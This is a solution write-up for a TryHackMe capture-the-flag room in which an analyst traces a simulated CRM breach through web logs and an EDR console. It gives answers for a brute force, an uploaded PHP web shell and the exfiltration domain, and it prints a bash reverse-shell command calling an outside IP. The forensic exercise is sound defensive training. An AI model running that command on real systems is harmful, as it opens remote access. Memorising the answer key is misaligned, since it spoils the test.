<h1 align="center"><a href="https://tryhackme.com/room/first-shift-ctf">First Shift CTF</a> &nbsp;&nbsp; · &nbsp;&nbsp; Portal Drop</h1>
<p align="center">If you find it helpful, consider coming back for research.<br><p align="center"><a href="https://github.com/RosanaFSS"><img src="https://img.shields.io/github/followers/RosanaFSS?label=Follow&style=for-the-badge&logo=github&color=24292e" alt="Follow Rosana on GitHub"></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="https://img.shields.io/badge/COMPLETED-2026%2C%20JAN%2026-444444?style=for-the-badge&logo=calendar-check" alt="Completion Date"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href="https://www.linkedin.com/in/rosanafssantos/"><img src="https://img.shields.io/badge/Connect-LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white" alt="Connect on LinkedIn"></a></p>


<h2>Portal Drop</h2>
<p>You are on the day shift in the ProbablyFine when the monitoring dashboard flashes red. A new alert appears in the WAF summary, reporting a web scan on <code>crm.trypatchme.thm</code> followed by a suspicious file upload anomaly. The affected website is TryPatchMe's public-facing CRM portal, a valued customer who provides software patching consulting services.<br>
That should be an easy case, since you have access to both the web access logs and the EDR console. Combined, they should give you a clear answer: either it's a False Positive, or the portal has been breached and TryPatchMe needs to patch the CRM now!</p>


<h2>EDR and Web Logs</h2>
<p> [ Download Task Files ] </p>
<p>For this challenge, you need to download the web access logs by clicking the "Download Task Files" button above, and for some questions, you will need the EDR console below: ...</p>

<p><em>Answer the questions below</em></p>

<br>
<p>5.1. <em>What is the IP address that initiated the brute force on the CRM web portal?</em><br>
<code>34.67.91.83</code></p>

<p>
  
- <strong>14:16:14</strong></p>

<img width="1470" height="147" alt="image" src="https://github.com/user-attachments/assets/ff3a4dcd-ae5f-4820-a002-08174f8c0c5c" />

<br>
<br>
<br>
<p>5.2. <em>How many successful and failed logins are seen in the logs?
Answer Example: 42, 56</em><br>
<code>18, 35</code></p>


<img width="653" height="256" alt="image" src="https://github.com/user-attachments/assets/b49297e1-6753-4586-a9c3-f18255338b9f" />

<br>
<br>
<br>
<p>5.3. <em>Following the brute force, which user-agent was used for the file upload?</em><br>
<code>python-requests/2.31.0</code></p>
<p>
  
- <strong>14:27:32</strong></p>

<img width="1269" height="470" alt="image" src="https://github.com/user-attachments/assets/4680f5c8-c03d-4b55-95ca-9e051c293d15" />

<br>
<br>

<img width="1263" height="513" alt="image" src="https://github.com/user-attachments/assets/9d1f3f99-3c84-4c17-ac60-c524efdfa9a2" />

<br>
<br>
<br>
<p>5.4. <em>What was the name of the suspicious file uploaded by the attacker?</em><br>
<code>invoice.php</code></p>

<p>
  
- <strong>14:27:32</strong></p>

<img width="1274" height="566" alt="image" src="https://github.com/user-attachments/assets/bebfa709-7bf6-4cd0-98b2-ff7650642770" />

<br>
<br>
<br>
<p>5.5. <em>At what time did the attacker first invoke the uploaded script?
Answer Example: 2025-10-24 15:35:50</em><br>
<code>2025-11-06 14:27:34</code></p>

<p>
  
- <strong>14:27:34</strong></p>

<img width="1564" height="400" alt="image" src="https://github.com/user-attachments/assets/231ee332-ee56-42c2-91bd-17b896546c09" />

<br>
<br>
<br>
<p>5.6. <em>What is the first decoded command the attacker ran on the CRM?</em><br>
<code>whoami</code></p>

<p>
  
- <strong>14:27:34</strong></p>

<img width="1521" height="107" alt="image" src="https://github.com/user-attachments/assets/1b4b1622-a1f2-4f5c-878b-cb72126de9e4" />


<br>
<br>

<img width="1904" height="310" alt="image" src="https://github.com/user-attachments/assets/47935a35-fea8-4318-bcb6-502f98b652d0" />

<br>
<br>
<br>
<p>5.7. <em>Based on the attacker’s activity on the CRM, which MITRE ATT&CK Persistence sub-technique ID is most applicable?</em><br>
<code>T1505.003</code></p>

<img width="1877" height="424" alt="image" src="https://github.com/user-attachments/assets/69a5b83e-b38e-4e16-a0a0-f62e6e7c7aa9" />

<br>
<br>

<img width="1889" height="297" alt="image" src="https://github.com/user-attachments/assets/960a67c5-6df2-43c5-acd2-9d8944a462b8" />

<br>
<br>
<br>
<p>5.8. <em>Which process image executes attacker commands received from the web?</em><br>
<code>/usr/sbin/php-fpm7.4</code></p>

<img width="1261" height="379" alt="image" src="https://github.com/user-attachments/assets/dd97f8e7-1cbb-4921-b753-dde1fec0b19d" />

<br>
<br>
<br>
<p>5.9. <em>What command allowed the attacker to open a bash reverse shell?</em><br>
<code>bash -i >& /dev/tcp/115.58.148.86/8080 0>&1</code></p>

<img width="1564" height="400" alt="image" src="https://github.com/user-attachments/assets/231ee332-ee56-42c2-91bd-17b896546c09" />

<br>
<br>

<img width="1902" height="388" alt="image" src="https://github.com/user-attachments/assets/e3417f19-d137-4187-b878-5d1ebae164a8" />

<br>
<br>
<br>
<p>5.10. <em>Which Linux user executes the entered malicious commands?</em><br>
<code>www-data</code></p>

<img width="1248" height="781" alt="image" src="https://github.com/user-attachments/assets/9aadc437-c107-4ac3-8c84-c3cbdeb3bcc4" />

<br>
<br>
<br>
<p>5.11. <em>What sensitive CRM configuration file did the attacker access? </em><br>
<code>/etc/trycrm/config.json</code></p>

<img width="1254" height="595" alt="image" src="https://github.com/user-attachments/assets/6b644638-5f6c-4fa4-9c55-4268e7bef7f4" />

<br>
<br>
<br>
<p>5.12. <em>Which domain was used to exfiltrate the CRM portal database?</em><br>
<code>portaldrop2025.xyz</code></p>

<img width="1253" height="645" alt="image" src="https://github.com/user-attachments/assets/1ada6ab4-af65-400a-9392-d7aad2983190" />

<br>
<br>
<br>
<p>5.13. <em>What flag do you get after completing all 12 EDR response actions?</em><br>
<code>THM{•••••••••••••••}</code></p>

<img width="1273" height="538" alt="image" src="https://github.com/user-attachments/assets/71fce25c-12f8-4035-a1d6-427213301528" />


